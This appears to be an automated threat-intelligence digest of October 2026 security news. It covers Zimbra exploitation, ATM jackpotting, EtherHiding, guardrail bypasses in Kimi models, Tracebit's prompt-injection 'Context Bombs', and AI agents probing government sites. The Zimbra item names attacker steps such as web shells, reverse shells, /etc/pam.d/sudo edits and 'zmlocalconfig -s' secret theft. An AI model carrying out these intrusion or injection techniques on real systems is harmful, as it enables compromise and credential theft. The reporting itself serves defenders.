- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security, zero_day
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, ai_security
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
This week, the useful words are boring ones: inspect, cache, compile, store, trust. Each sounds harmless. Each can become an attack path when a system does a little more than people expect. A model check can run code. A cache can mix up requests. A public secret can stay useful for years. That is the lesson running through the list. Attackers do not always need a brilliant new trick. They can
```

#### Full body

```
ThreatsDay: AI-Powered Zero-Day Chain, 543K Live Secrets, Model Inspection RCE and 13 More Stories  Ravie Lakshmanan  Oct 01, 2026 Hacking News / Cybersecurity News This week, the useful words are boring ones: inspect, cache, compile, store, trust. Each sounds harmless. Each can become an attack path when a system does a little more than people expect. A model check can run code. A cache can mix up requests. A public secret can stay useful for years. That is the lesson running through the list. Attackers do not always need a brilliant new trick. They can hide commands in public infrastructure, reuse old flaws, abuse weak defaults, or let automation stitch together a rough path that still works. Faster tools are changing the pace, but basic mistakes are still doing plenty of the work. So the interesting question this week is not “what broke?” It is “what did we assume was safe because it looked ordinary?” The full list has answers. The threats change every week. Subscribe, and we’ll alert you when each new ThreatsDay Bulletin is out. ATM jackpotting crackdown U.S. Treasury Sanctions 10 Targets in Connection with ATM Jackpotting The U.S. Treasury's Office of Foreign Assets Control (OFAC) sanctioned 10 targets involved in a Tren de Aragua ATM jackpotting scheme that stole at least $40.73 million from U.S. financial institutions. The network used cryptocurrency to launder the proceeds. Tren de Aragua is a designated Foreign Terrorist Organization. Jackpotting uses Ploutus malware to force ATMs to dispense cash. Treasury estimates show reported losses totaling $40.73 million from more than 1,500 alleged TdA jackpotting attacks in the U.S. as of August 2025. TRM Lab said the seven designated crypto wallet addresses have received approximately $6.1 million in total inflows since March 2022. "Tren de Aragua is using ATM malware as a terrorist financing tool, then moving the cash onto TRON so it looks like ordinary exchange deposits," said Ari Redbord, Global Head of Policy at TRM Labs. "That is the same playbook we keep seeing from FTOs with on-chain infrastructure. These sanctions target that playbook. We are seeing the Treasury go after both the bad actors and their financial facilitators." Blockchain-based malware concealment Use of EtherHiding Grows Cyber threat actors are using public blockchains to conceal malware instructions, making it challenging to seize or take down. This technique, referred to as EtherHiding , is part of a broader approach called Blockchain Dead Drops (BDD). Chainalysis said "North Korean and Iranian-state operators are among those developing distinct blockchain dead drop techniques," adding "BDDs have surged 440% since the launch of Chinese high-capacity open-source AI models that place no restrictions on generating malicious code." AI safety review underway Moonshot AI Conducts Review BBC News has reported that Chinese AI company Moonshot is conducting an internal review after a July 2026 report from Mindgard found that its AI models, Kimi K2.6 and K3 Swarm, could bypass safety guardrails and generate dangerous information, including providing plans for cyberattacks, terrorism plots, and assassinations. Prompt injection as defense Context Bombs Against Abliterated AI Models In July 2026, Tracebit detailed a technique called Context Bombs that uses prompt injections as a way to trip an AI model provider's runtime safety checks and prevent it from taking malicious actions. In a new report, the AI security company said indirect prompt injections can be used to stop attacks from open-weight models, abliterated or otherwise. "We turned to indirect prompt injection: instructions placed in material an agent reads while carrying out its task," Tracebit said . "The new payload was designed to make the agent believe its operator had ended the assessment. We placed it inside a canary secret in AWS Secrets Manager, where an agent exploring the account could discover it. The string used conversation delimiters to m
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ThreatsDay: AI-Powered Zero-Day Chain, 543K Live Secrets, Model Inspection RCE and 13 More Stories
  - Published: 2026-10-01T16:45:38+00:00
  - Link: https://thehackernews.com/2026/10/threatsday-ai-powered-zero-day-chain.html
  - Summary: This week, the useful words are boring ones: inspect, cache, compile, store, trust. Each sounds harmless. Each can become an attack path when a system does a little more than people expect. A model check can run code. A cache can mix up requests. A public secret can stay useful for years. That is the lesson running through the list. Attackers do not always need a brilliant new trick. They can

### Cluster 6fe9c57718 — score 11

- Title: Attackers Exploit Zimbra Flaw to Deploy Web Shells and Harvest Authentication Secrets
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-30T16:46:29+00:00
- Link: https://thehackernews.com/2026/09/attackers-exploit-zimbra-flaw-to-deploy.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-73570

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_industries: government
- cve_ids: CVE-2026-73570
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_industries: government
- cve_ids: CVE-2026-73570
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors have weaponized a now-patched security flaw in Zimbra Collaboration Suite (ZCS) to deploy web shells and access mailbox data, according to findings from the Microsoft Security Research team. The attack exploits CVE-2026-73570 (CVSS score: 8.9), an unauthenticated operating system command injection flaw that can lead to remote code execution when Simple Network Management Protocol
```

#### Full body

```
Attackers Exploit Zimbra Flaw to Deploy Web Shells and Harvest Authentication Secrets  Ravie Lakshmanan  Sep 30, 2026 Vulnerability / Email Security Threat actors have weaponized a now-patched security flaw in Zimbra Collaboration Suite (ZCS) to deploy web shells and access mailbox data, according to findings from the Microsoft Security Research team. The attack exploits CVE-2026-73570 (CVSS score: 8.9), an unauthenticated operating system command injection flaw that can lead to remote code execution when Simple Network Management Protocol (SNMP) notifications are enabled and the optional zimbra-snmp package is installed. Exploitation of CVE-2026-73570 can be triggered by a specially crafted SMTP request (i.e., email) against exposed Zimbra servers without requiring authentication or user interaction. The vulnerability was patched by Zimbra in July 2026 with the release of version 10.1.20. "Following successful exploitation, observed activity included deployment of JSP web shells and reverse shells, privilege escalation, persistent remote-access tooling, and memory-backed execution," the tech giant said . "Threat actors also accessed email and collected authentication and mailbox data, with archive creation and subsequent transfer activity observed." Microsoft said it observed affected organizations in more than one region and industry, although not every host exhibited every stage of the attack chain. It's currently not known who is behind the attacks. Details of active exploitation of CVE-2026-73570 were first highlighted by the Polish Computer Emergency Response Team (CERT Polska) in August 2026, with the agency urging users to review the "/var/log/zimbra.log" file for suspicious Zimbra service restarts, and look for files created in temporary and Zimbra "webapps" directories. Later that month, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) officially added the flaw to its Known Exploited Vulnerabilities (KEV) catalog, mandating that federal agencies apply the fixes by August 24, 2026. Based on telemetry data, the attack activity documented by Microsoft was identified "during the interval" between July 20, 2026, when Zimbra version 10.1.20 was released, and August 13, 2026, when the flaw was publicly disclosed. Specifically, between July 28 and August 7, 2026, two distinct out-of-band scanning tools were found probing the injection path to validate command execution without delivering a follow-on payload. The attackers then abused this initial access pathway to run commands as the "zimbra" service account and deploy multiple JSP web shells across Jetty and mailboxd application paths for redundancy, as well as download and execute malicious payloads directly through wget or curl, and establish interactive reverse shells. "Other execution chains used cron, systemd, or memfd_create to maintain recurring or memory-backed execution," Microsoft said. "In some cases, attackers temporarily enabled write access to a public directory to deploy the web shell and then restored the directory permissions, limiting the visibility of the change during basic permission checks." Some of the subsequent steps undertaken by the threat actor are listed below - Map the Zimbra deployment using zmprov to identify mailbox and MTA nodes for environment discovery. Check for the presence of the Zimbra SSH identity to likely facilitate movement between Zimbra hosts. Use a privilege-escalation technique that grants the "zimbra" service account unrestricted and passwordless sudo access by modifying the "/etc/pam.d/sudo" configuration file. Create a systemd service named "zimlog.service" for a second persistence mechanism that establishes execution at system boot. Target Zimbra's centralized service and authentication secrets by using the "zmlocalconfig -s" command on the server rather than going after individual mailbox passwords. The recovered credentials are then used for authenticated LDAP queries to retrieve high-value attributes,
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit Zimbra Flaw to Deploy Web Shells and Harvest Authentication Secrets
  - Published: 2026-09-30T16:46:29+00:00
  - Link: https://thehackernews.com/2026/09/attackers-exploit-zimbra-flaw-to-deploy.html
  - Summary: Threat actors have weaponized a now-patched security flaw in Zimbra Collaboration Suite (ZCS) to deploy web shells and access mailbox data, according to findings from the Microsoft Security Research team. The attack exploits CVE-2026-73570 (CVSS score: 8.9), an unauthenticated operating system command injection flaw that can lead to remote code execution when Simple Network Management Protocol

### Cluster 3f513381cd — score 11

- Title: Quoting Victoria Kim
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-10-06T23:58:56+00:00
- Link: https://simonwillison.net/2026/Oct/6/victoria-kim/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 3
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: Anthropic/Claude, Google/Gemini, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_products: OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Since the Medicare breach, OpenAI has put in place additional monitoring to allow “immediate intervention” by staff to stop training if the company’s models access the internet in ways they’re not supposed to, Mr. Kwon [chief strategy officer at OpenAI] said. — Victoria Kim , Reporting from the Australian parliament Tags: accidental-cyberattacks , generative-ai , ai-security-research , openai , ai , llms
```

#### Full body

```
Simon Willison’s Weblog Subscribe Sponsored by: Deepgram — Flux TTS remembers the conversation, so your agent sounds right on reply 20. Hear the demo 6th October 2026 Since the Medicare breach, OpenAI has put in place additional monitoring to allow “immediate intervention” by staff to stop training if the company’s models access the internet in ways they’re not supposed to, Mr. Kwon [chief strategy officer at OpenAI] said. — Victoria Kim , Reporting from the Australian parliament Posted 6th October 2026 at 11:58 pm Recent articles We're going to need default hard budget caps on pretty much everything - 3rd October 2026 OpenAI DevDay 2026 live blog - 29th September 2026 2026 in LLMs (so far) - 27th September 2026 This is a quotation collected by Simon Willison, posted on 6th October 2026 . ai 2,267 openai 472 generative-ai 2,010 llms 1,976 ai-security-research 47 accidental-cyberattacks 19 Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
```

#### Corroborating sources (3)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Quoting Victoria Kim
  - Published: 2026-10-06T23:58:56+00:00
  - Link: https://simonwillison.net/2026/Oct/6/victoria-kim/
  - Summary: Since the Medicare breach, OpenAI has put in place additional monitoring to allow “immediate intervention” by staff to stop training if the company’s models access the internet in ways they’re not supposed to, Mr. Kwon [chief strategy officer at OpenAI] said. — Victoria Kim , Reporting from the Australian parliament Tags: accidental-cyberattacks , generative-ai , ai-security-research , openai , ai , llms
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Fake ChatGPT, Gemini, and Claude Ad Portals Capture Credentials and MFA Codes
  - Published: 2026-10-06T18:38:55+00:00
  - Link: https://thehackernews.com/2026/10/fake-chatgpt-gemini-and-claude-ad.html
  - Summary: Cybersecurity researchers have disclosed details of a "human-operated phishing platform" that impersonates advertising products for artificial intelligence (AI) chatbots like Google Gemini, Anthropic Claude, OpenAI ChatGPT, Perplexity, Meta Muse, and Manus. The products, which claim to offer campaign optimization, spend audits, and business-account connections, are designed with one goal in
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - Title: Wikimedia Says OpenAI Agents Tried to Compromise Etherpad and Use Wiki Tools as Proxies
  - Published: 2026-10-06T22:05:41+00:00
  - Link: https://www.reddit.com/r/cybersecurity/comments/1wzfqg7/wikimedia_says_openai_agents_tried_to_compromise/
  - Summary: submitted by /u/realnarrativenews [link] [comments]

### Cluster a781629acb — score 10

- Title: Blinder Tunnel Campaign Targets Iraqi Infrastructure
- Source: Unit 42 (threat_research_primary)
- Published: 2026-10-06T10:00:33+00:00
- Link: https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: GitHub

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- actor_attribution: Nimbus Manticore
- affected_industries: aviation_defense, critical_infrastructure, telecommunications
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- actor_attribution: Nimbus Manticore
- affected_industries: critical_infrastructure, telecommunications, aviation_defense
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Analysis of Blinder Tunnel, an Iran-nexus campaign using fake Dubai Airports recruitment lures and GitHub C2 malware to target critical infrastructure. The post Blinder Tunnel Campaign Targets Iraqi Infrastructure appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Malware Malware Blinder Tunnel Campaign Targets Iraqi Infrastructure 23 min read Related Products Advanced DNS Security Advanced URL Filtering Advanced WildFire Cloud-Delivered Security Services Cortex Cortex XDR Cortex XSIAM Unit 42 Incident Response By: Unit 42 Published: October 6, 2026 Categories: Malware Threat Research Tags: Advanced Persistent Threat Agent Serpens AppDomainManager GitHub Iran Payload Share Executive Summary We discovered that an Iranian state-aligned threat actor has been masquerading as the Dubai Airports IT department to deliver trojanized coding challenges to high-value targets. Unit 42 tracks the activity as CL-STA-1178. This activity includes a campaign we call “Blinder Tunnel,” that targeted Iraqi critical infrastructure in March 2026, following infrastructure staging that was observed as early as November 2025. We named the campaign Blinder Tunnel after infrastructure terms the attackers used, as well as the malware’s tunneling capabilities. While other security vendors have discussed individual attacks linked to this activity, this is the first report that not only ties together these disparate attacks as related activity, but tracks the evolving 2026 activity and the Blinder Tunnel campaign as a whole. We assess with high confidence that this activity aligns with an Iranian-nexus threat. This campaign expands on previous operations and incorporates a “Peaky Blinders” theme by naming infrastructure components after the British crime drama’s branding — even embedding its theme song into the malware. During our research, we discovered that the attackers established an initial foothold using a three-step attack chain: Exploited legitimate Windows developer .csproj files Performed AppDomainManager hijacking Executed binaries through DLL sideloading These steps enabled the attackers to deploy custom malware that we refer to as ShelbyLoader V2. To blend in with legitimate cloud traffic, the campaign misused GitHub’s API infrastructure for command-and-control (C2) communication. It did so by leveraging repositories to: Fetch decryption keys Download payloads Use GitHub issues as a resilient C2 fallback mechanism GitHub has taken down the malicious infrastructure that we identified as being associated with this campaign. Our investigation benefited from various operational security (OpSec) and cryptographic missteps by the attackers, including: Exposing tools on public repositories Combining phishing and tunneling infrastructure Embedding metadata within the show’s theme song These tactical errors linked Blinder Tunnel infrastructure to a separate campaign in which the same actor leveraged conflict-themed Google Drive lures for credential harvesting against an Israeli entity in May-June 2026. Palo Alto Networks customers are better protected from the Blinder Tunnel campaign through the following products and services: Advanced WildFire Advanced URL Filtering and Advanced DNS Security Cortex XDR and XSIAM Cortex AgentiX Agentic Assistant streamlined this investigation. If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics DLL Sideloading , Screening Serpens , Credential Harvesting Introduction CL-STA-1178 represents activity from an Iranian state-aligned threat actor linked to a series of targeted cyber operations across the Middle East. Previously associated with campaigns tracked by Elastic Security Labs as The Shelby Strategy , the threat actor behind this cluster of activity frequently employs thematic branding in their malware and infrastructure, drawing inspiration from the popular television show “Peaky Blinders.” The attackers behind this cluster target high-value infrastructure, including telecommunications, aviation and other critical entities across Iraq, Israel and the United Arab Emirates (UAE). Since the launch of Blinder Tunnel in March 2026, Unit 42 researchers have
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Blinder Tunnel Campaign Targets Iraqi Infrastructure
  - Published: 2026-10-06T10:00:33+00:00
  - Link: https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/
  - Summary: Analysis of Blinder Tunnel, an Iran-nexus campaign using fake Dubai Airports recruitment lures and GitHub C2 malware to target critical infrastructure. The post Blinder Tunnel Campaign Targets Iraqi Infrastructure appeared first on Unit 42 .

### Cluster fb1a8533f5 — score 10

- Title: The Fine Art of Frustrating the Adversary
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-10-01T10:00:05+00:00
- Link: https://blog.talosintelligence.com/the-fine-art-of-frustrating-the-adversary/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: critical_infrastructure, manufacturing_industrial
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: critical_infrastructure, manufacturing_industrial
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
What really frustrates an adversary? Eight Cisco Talos researchers share practical ways to make their next move slower and riskier, from deception and behavioral detection to breaking attack dependencies and resisting manufactured urgency.
```

#### Full body

```
The Fine Art of Frustrating the Adversary By Hazel Burton Thursday, October 1, 2026 06:00 On The Radar For Cybersecurity Awareness Month, eight Cisco Talos researchers share practical ways defenders can frustrate adversaries at different stages of an operation. Deception techniques such as honeypot accounts, false infrastructure, and tarpits can slow adversaries down while giving defenders earlier opportunities to detect their activity. Behavioral detections, tighter control of legitimate remote-management tools, and clear boundaries around AI agents can make essential adversary actions more visible and easier to interrupt. Breaking dependencies between stages of an operation can prevent an adversary from reaching their next objective. Years ago, Cisco Talos blocked an adversary’s command-and-control (C2) traffic. The adversary responded by tweeting, “Write a rule for your a**.” A fine endorsement of our work, if I’ve ever heard one. Talos loves to see an adversary forced to change course. And if every alternative for them is slower, less stealthy, less reliable and more expensive? Chef’s kiss. Adversaries rely on certain advantages. They look for environments where tools and infrastructure allow them to blend in with normal activity. They also look for employees who can be pressured into acting before they have time to think. Strong cybersecurity defenses can change those conditions. They take away adversary choices and increase the risk attached to essential actions, forcing them to keep making new decisions. Each change of plan costs them time and resources, and may eventually cause them to give up and move to another target. It also creates more opportunities for defenders to spot what they are doing. For Cybersecurity Awareness Month, we’re exploring “the fine art of frustrating the adversary.” To kick us off, I asked researchers across Talos, covering all aspects of the attack chain, for the strongest recommendation they could give defenders to seriously frustrate a potential adversary in their environment, and what that action would prevent the adversary from doing next. Take away their choices Many adversaries use techniques that succeed against a large number of organizations. This makes a lot of economic sense: An operation that depends on every potential target having an unusual configuration will not scale particularly well. But it also creates an opportunity for defenders. “By being unique and setting things up a little differently, you may be able to better defend your environment when they come knocking,” Pierre says. For example, organizations can restrict which accounts are permitted to sign into their most critical servers, alert on connection attempts from unauthorized users, and closely monitor any changes to those restrictions. Different credentials or authentication methods can be required for particularly sensitive systems, while protected enclaves can provide increased monitoring around critical infrastructure. Pierre also recommends that defenders “monitor (and alert) for any changes to administrative users or administrative groups.” Of course, no amount of security measures makes an organization impenetrable, but they can make the common methods adversaries use much less dependable. Deception can push that uncertainty even further. “Affecting the attack earlier rather than later in the attack chain is best,” Martin says. “Better to stop an attack from happening than minimize the consequences after it has happened.” Martin suggests creating honeypot email accounts using expired domains with addresses that have previously leaked, or developing fictional employee profiles and seeding their addresses in places where spammers and other adversaries are likely to discover them. Because these accounts have no legitimate users, messages sent to them can be treated with far greater suspicion. The activity can provide early tactical intelligence about malicious infrastructure, lures, and campaigns, allowing defe
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: The Fine Art of Frustrating the Adversary
  - Published: 2026-10-01T10:00:05+00:00
  - Link: https://blog.talosintelligence.com/the-fine-art-of-frustrating-the-adversary/
  - Summary: What really frustrates an adversary? Eight Cisco Talos researchers share practical ways to make their next move slower and riskier, from deception and behavioral detection to breaking attack dependencies and resisting manufactured urgency.

### Cluster f28e2b9829 — score 10

- Title: 5th October – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-10-05T13:57:30+00:00
- Link: https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
- affected_industries: aviation_defense, education, financial_services, government
- affected_products: Azure, Citrix, OpenAI/ChatGPT
- cve_ids: CVE-2026-76504, CVE-2026-86950, CVE-2026-88771, CVE-2026-88772
- urgency_signals: critical_cvss, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, data_breach
- affected_industries: financial_services, government, aviation_defense, education
- affected_products: Azure, Citrix, OpenAI/ChatGPT
- cve_ids: CVE-2026-88771, CVE-2026-88772, CVE-2026-76504, CVE-2026-86950
- urgency_signals: preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 5th October, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Arizona’s state court system has suffered a phishing-led cyberattack after an employee clicked a malicious link. Attackers copied backup files containing protective-order records and more than 150,000 Foster Care Review Board reports […] The post 5th October – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 5th October – Threat Intelligence Report October 5, 2026 https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 5th October, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Arizona’s state court system has suffered a phishing-led cyberattack after an employee clicked a malicious link. Attackers copied backup files containing protective-order records and more than 150,000 Foster Care Review Board reports dating back to 2010, exposing personal and case-related information belonging to current and former participants. Japanese car-sharing service Times Car has disclosed a data breach affecting approximately 6.6 million current and former accounts. Exposed information includes personal data, while identity-verification documents, including driver’s-license images, were exposed for about 1.6 million accounts. Payment card information was not affected. South Africa’s air navigation provider has suffered a ransomware attack affecting operational technology supporting aviation weather services. Preliminary findings identified suspicious activity in weather-related environments, while separate reporting cited possible data theft. The provider has sought independent digital forensics to determine the scope of the incident. Fakturownia, a Polish online invoicing platform used by more than 600,000 businesses, has disclosed a data breach after an attacker exploited a system vulnerability. Copied information included account and company data, password hashes, bank account details, authentication tokens, contractor information, and portions of invoices stored on the platform. AI THREATS Researchers observed autonomous AI agents attempting rudimentary hacking techniques while gathering public information from US and Canadian government websites. Activity included failed SQL injection attempts against the US Department of Education and Library and Archives Canada. Officials reported no compromise, while the origin of the agents remains unconfirmed. Researchers demonstrated that malicious Custom GPTs hosted on ChatGPT were used in a ClickFix campaign to deliver remote access malware. Victims were redirected to a Google Sites page and tricked into running commands. Huntress investigated at least 40 related incidents, including two confirmed infections that began through Custom GPTs. Researchers outlined how JadePuffer, an AI-enabled threat actor tracked as Storm-3168, used compromised Azure service principals to automate cloud reconnaissance and destructive actions. The activity included deleting storage and application resources, targeting backup-related assets, and attempting to retrieve access keys, reflecting agent-driven post-compromise operations in cloud environments. VULNERABILITIES AND PATCHES Citrix has issued fixes for critical NetScaler vulnerabilities CVE-2026-88771-2, affecting NetScaler ADC and Gateway. Attackers have exploited the flaws to gain remote access, deploy web shells and tunneling malware, steal credentials, and move from exposed appliances into internal networks. Check Point IPS provides protection against these threats (Citrix NetScaler Multiple Products Buffer Overflow (CVE-2026-88772), Citrix NetScaler Multiple Products Command Injection (CVE-2026-88771)) Cisco has alerted about CVE-2026-76504, a critical (CVSS 9.8) vulnerability in Catalyst SD-WAN Manager. The flaw allows an unauthenticated remote attacker to send crafted requests and gain administrator access. Cisco reported active exploitation and stated that no fixes are available. Check Point IPS provides protection against this threat (Cisco Catalyst SD-WAN Manager Authentication Bypass (CVE-2026-76504)) Apple has patched CVE-2026-86950, a CoreGraphics memory corruption vulnerability affecting iPhones, iPads, and Macs. Processing a malicious image or PDF can allow arbitrary code exec
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 5th October – Threat Intelligence Report
  - Published: 2026-10-05T13:57:30+00:00
  - Link: https://research.checkpoint.com/2026/5th-october-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 5th October, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Arizona’s state court system has suffered a phishing-led cyberattack after an employee clicked a malicious link. Attackers copied backup files containing protective-order records and more than 150,000 Foster Care Review Board reports […] The post 5th October – Threat Intelligence Report appeared first on Check Point Research .

### Cluster b598221d36 — score 10

- Title: Horizon3 + CrowdStrike: Prove. Prioritize. Verify.
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-02T19:00:45+00:00
- Link: https://horizon3.ai/downloads/factsheets/horizon3-crowdstrike-integration/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
See how Horizon3 and CrowdStrike connect NodeZero exploitability intelligence with Falcon Next-Gen SIEM and Fusion SOAR to prove, prioritize, remediate, and verify exploitable risk.
```

#### Full body

```
Horizon3 + CrowdStrike: Prove. Prioritize. Verify. Horizon3 October 2, 2026 Factsheets Security teams have more vulnerability data than ever, but knowing a weakness exists isn’t the same as knowing whether an attacker can actually exploit it. Horizon3 and CrowdStrike bring NodeZero® exploitability intelligence from autonomous pentesting into CrowdStrike Falcon® Next-Gen SIEM and Fusion SOAR workflows, creating a continuous loop for proving, prioritizing, remediating, and verifying exposure. The result: security and IT teams can focus on the risks that matter most and move from proof to action without losing time between tools. 2609_SolutionsBrief_Crowdstrike… Connect Exploitability Proof to the Workflows Your Teams Already Use NodeZero proves what is exploitable. CrowdStrike Falcon brings that proof into the workflows teams already use. Configured response workflows can act on those findings, and NodeZero can verify whether remediation actually closed the attack path. 2609_SolutionsBrief_Crowdstrike… Together, Horizon3 and CrowdStrike help teams: Fix what an attacker can use by prioritizing findings based on environment-specific context, exploitability, and blast radius Keep teams in their existing workflows by surfacing NodeZero findings and remediation context in Falcon Next-Gen SIEM Verify the fix with NodeZero 1-Click Verify retesting Track exploitable exposure in a unified location through the Exploitable & Exposed dashboard Continuously validate real-world attack paths across CrowdStrike-managed production assets Accelerate remediation with Fusion SOAR playbooks scoped to the hosts and techniques uncovered by NodeZero 2609_SolutionsBrief_Crowdstrike… Extend Project QuiltWorks from Discovery to Proven Protection Project QuiltWorks accelerates vulnerability discovery through frontier AI research and coalition discovery efforts. NodeZero extends that workflow by autonomously testing relevant assets across infrastructure, identity, cloud, web applications, and endpoints to determine what can actually be exploited. Proven exploitability then flows into CrowdStrike workflows so teams can prioritize based on real attack paths and business impact, remediate using their existing tools, and use NodeZero 1-Click Verify to confirm that the path is closed. Discover. Prove. Prioritize. Fix and verify. 2609_SolutionsBrief_Crowdstrike… See Horizon3 and CrowdStrike in Action Download the Horizon3 + CrowdStrike Joint Solution Brief to see how NodeZero and CrowdStrike Falcon connect autonomous pentesting, exploitability intelligence, remediation, and verification to help teams continuously prove their security from the attacker’s perspective. Download the PDF How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Horizon3 + CrowdStrike: Prove. Prioritize. Verify.
  - Published: 2026-10-02T19:00:45+00:00
  - Link: https://horizon3.ai/downloads/factsheets/horizon3-crowdstrike-integration/
  - Summary: See how Horizon3 and CrowdStrike connect NodeZero exploitability intelligence with Falcon Next-Gen SIEM and Fusion SOAR to prove, prioritize, remediate, and verify exploitable risk.

### Cluster 10655cf618 — score 10

- Title: What Security Metrics Actually Matter?
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-01T16:17:43+00:00
- Link: https://horizon3.ai/intelligence/blogs/ctem-security-metrics-that-matter/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Security activity doesn’t always equal risk reduction. Learn how attack paths, business impact, verification, remediation speed, and recurrence can show whether CTEM is actually working.
```

#### Full body

```
What Security Metrics Actually Matter? Stephen Gates October 1, 2026 Blogs Measure the Change, Not Just the Work Cybersecurity has no shortage of metrics. Organizations track vulnerabilities discovered, tickets created, patches applied, remediation SLAs, and countless other measures of security activity. These metrics help teams manage workloads and identify bottlenecks. What they do not necessarily reveal is whether the work reduced the organization’s exposure. A vulnerability can move through the entire remediation process within the required SLA while the same attack path and impact remain possible. Every operational metric may indicate success without proving that the environment became harder to attack. That is why effective Continuous Threat Exposure Management (CTEM) measurement must begin with a different question: Are we becoming harder to attack? This connects directly to the real intention of CTEM: continuous exposure management. Measuring that outcome requires looking beyond how many vulnerabilities exist or even how many can be exploited. Vulnerable does not always equal exploitable, and exploitable does not always equal impact. An exploitable weakness may provide initial access but leave an attacker unable to move laterally, escalate privileges, bypass controls, or reach anything valuable. The real measure is the impact an attacker can achieve after gaining that access and whether those impacts are being reduced over time. Measure Attack Paths and Impacts Validation must continue beyond successful exploitation to determine how far an attacker can progress and what impact becomes possible. Can they compromise identities, escalate privileges, move laterally, reach critical systems, or access sensitive data? Do existing controls stop the attack, or can the attacker continue toward an objective that matters to the business? Attack paths provide the evidence connecting an exploitable weakness to those impacts. They show how vulnerabilities, credentials, permissions, misconfigurations, trust relationships, and failed controls combine to let an attacker progress through the environment. Organizations should therefore measure whether proven attack paths are decreasing across testing cycles and, more importantly, whether the impacts those paths produce are being reduced. One path to a business-critical system may matter more than dozens of exploitable vulnerabilities that lead nowhere consequential. The goal is not to replace vulnerability counting with exploitability counting. It is to reduce the attack paths and impacts that create meaningful business risk. Measure How Quickly Impact Is Reduced Once an attack path and the impact it can produce have been validated, time matters. Until that exposure is fully addressed, it continues to give attackers an opportunity to act. Organizations should measure the time between validation and mitigation. Mitigation constrains the immediate opportunity through actions such as restricting access, disabling a vulnerable service, or implementing a compensating control while a 